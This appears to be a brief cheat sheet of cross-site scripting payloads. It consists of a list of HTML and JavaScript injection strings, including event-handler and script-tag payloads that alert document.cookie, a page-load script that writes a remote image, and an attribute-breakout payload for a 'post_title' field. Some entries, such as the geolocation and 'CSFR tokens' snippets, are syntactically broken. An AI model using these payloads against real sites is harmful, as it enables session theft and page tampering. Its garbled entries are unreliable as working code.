## Self Cross-Site Scripting 
```mysql
<img src="" onerror="alert(document.cookie)">
```
## Non ExistantImage
```
<div><image src=validateNonExistantImage.png onloadstart=alert(1337)> hey girl hey </div>
```
## Get cookie
```
nu11secur1ty<script>alert(document.cookie)</script>
```
## Alert check
```
<script>alert("nu11secur1ty_is_here");</script>
```

## Hidden Image
```
<script>function a() { document.write("<img src='https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp'></img>"); }; window.onload = a; alert("A Hidden scripted image, warning you are vulnerable!");</script>
```
## Post image
```
<form action="#" method="post"><label for="imgURL">image URL:</label><input type="url" id="imgURL"/><label for="pageURL">page URL:</label><input type="url" id="pageURL"/><button id="imgAdd">add image</button></form>
```
## Error check
```
</span><img src=1 onerror=alert(1) /><span>
```
## CSFR tokens
```
<form action="https:/yourdomain.com/acquire_token.php"></textarea>
```
## Geolocation
```
<script>Var today = new Date().toLocaleString() + 'week' + 'day one two three four five six'.charAt(new Date().getDay());document.getElementById('remote').src = "htttp:// + today + "----" + encodeURIComponent(position.coords.latitude) + "," + encodeURIComponent(position.coords.longitude</script>
```
## "post_title" parameter
```
<input class="elementor-field elementor-field-textual elementor-size-lg" type="text" placeholder="" value="\"><script>alert(document.cookie)</script><\"" name="post_title" id="dce_view_f9fc119_post_title">
```
